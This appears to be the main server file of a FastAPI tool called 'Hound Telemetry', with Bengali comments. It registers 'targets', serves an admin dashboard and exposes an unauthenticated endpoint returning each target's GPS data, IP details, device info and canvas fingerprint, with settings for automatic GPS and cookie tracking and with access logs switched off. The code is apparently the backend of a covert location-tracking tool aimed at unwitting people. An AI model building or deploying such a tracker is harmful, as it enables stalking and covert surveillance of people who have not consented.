from contextlib import asynccontextmanager
from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.responses import JSONResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from app.webhook import router as webhook_router
from app.database import init_db, SessionLocal, CollectedData
from config import config
import uvicorn
import logging

# Uvicorn-এর অতিরিক্ত অ্যাক্সেস লগ মিউট করা
logging.getLogger("uvicorn.access").disabled = True

@asynccontextmanager
async def lifespan(app: FastAPI):
    config.LOG_DIR.mkdir(parents=True, exist_ok=True)
    config.DATA_DIR.mkdir(parents=True, exist_ok=True)
    (config.LOG_DIR / "targets").mkdir(parents=True, exist_ok=True)
    (config.DATA_DIR / "targets").mkdir(parents=True, exist_ok=True)
    init_db()
    print("✅ Database & Directories Initialized\n", flush=True)
    yield

app = FastAPI(title="Hound Telemetry", version="3.5", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ১. ব্যাকএন্ড এপিআই ও টেলিমেট্রি রুট
app.include_router(webhook_router)

@app.get("/config.json")
async def get_config():
    return JSONResponse({
        "gpsAuto": config.GPS_AUTO,
        "cookieTrack": config.COOKIE_TRACK,
        "autoCollect": config.AUTO_COLLECT,
        "mode": config.MODE,
        "port": config.PORT
    })

@app.get("/admin")
async def admin_dashboard():
    admin_file = config.STATIC_DIR / "admin.html"
    return FileResponse(admin_file)

@app.get("/api/targets")
async def get_targets():
    db = SessionLocal()
    records = db.query(CollectedData).order_by(CollectedData.timestamp.desc()).limit(100).all()
    db.close()
    
    targets = []
    for r in records:
        targets.append({
            "id": r.id,
            "user_id": r.user_id,
            "timestamp": r.timestamp.strftime("%Y-%m-%d %H:%M:%S") if r.timestamp else "N/A",
            "device_info": r.device_info or {},
            "gps_data": r.gps_data or {},
            "ip_info": r.ip_info or {},
            "canvas_fingerprint": r.canvas_fingerprint or "N/A"
        })
    return JSONResponse(targets)

# ২. স্ট্যাটিক পাথ মাউন্ট
app.mount("/static", StaticFiles(directory=str(config.STATIC_DIR)), name="static_dir")

# ৩. রুট ডিরেক্টরি মাউন্ট
app.mount("/", StaticFiles(directory=str(config.STATIC_DIR), html=True), name="static_root")

if __name__ == "__main__":
    uvicorn.run(
        "app.main:app",
        host="0.0.0.0",
        port=config.PORT,
        reload=config.DEBUG,
        access_log=False,       # টার্মিনালে 200 OK রিকোয়েস্ট স্প্যামিং বন্ধ করবে
        log_level="warning"     # অপ্রয়োজনীয় ইনফো লগ বন্ধ রাখবে
    )